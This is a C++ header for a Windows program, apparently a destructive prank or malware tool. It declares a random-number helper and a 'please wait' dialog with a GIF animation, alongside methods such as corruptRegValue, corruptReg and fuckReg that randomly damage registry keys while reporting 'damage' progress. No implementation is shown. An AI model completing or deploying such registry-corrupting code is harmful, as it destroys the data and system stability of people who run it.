#pragma once
#include <windows.h>
#include "SettingzDialog.h"

#include <gdiplus.h>
#include <random>
#include <atomic>

using namespace Gdiplus;
using namespace std;

#define WM_DAMAGE_PROGRESS_UPDATE (WM_USER + 101)
#define WM_DAMAGE_PROCESS_COMPLETED (WM_USER + 102)

class MyRandom
{
    private:
        mt19937 rng; // motore Mersenne Twister
        uniform_real_distribution<double> dist; // distribuzione per NextDouble

    public:
        MyRandom(int seed)
            : rng(seed), dist(0.0, 1.0) // inizializza rng e dist
        {
        }

        int Next(int min, int max)
        {
            uniform_int_distribution<int> d(min, max - 1); // max escluso
            return d(rng);
        }

        // simula Random.Next(max)
        int Next(int max)
        {
            return Next(0, max);
        }

        int Next()
        {
            return Next(0, INT_MAX);
        }

        double NextDouble()
        {
            return dist(rng);
        }
};

class PlizWaitDialog
{
public:
    PlizWaitDialog(HINSTANCE hInstance, double damage);

    INT_PTR Show(HWND hParent);

    static INT_PTR CALLBACK PlizWaitDialogProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

    HINSTANCE m_hInstance;
    HWND m_hWnd;
protected:

    BOOL OnDialogLoad();
public:
    MyRandom* rng = nullptr;

    atomic<double> damage = 0;

    atomic<int> progress;
    atomic<int> max;

    void LoadGIF();

    LRESULT OnDamageProgressUpdate(WPARAM wParam, LPARAM lParam);
    LRESULT OnDamageProcessCompleted(WPARAM wParam, LPARAM lParam);

    void corruptRegValue(HKEY hKey, const std::string& valueName, double dm);

    void corruptReg(HKEY hKey, double dm);

    void fuckReg(HKEY hKey, double dm);

    Bitmap* m_pGif = nullptr;

    GUID m_frameGuid;
    UINT m_frameCount = 0;
    int m_currentFrame = 0;

};
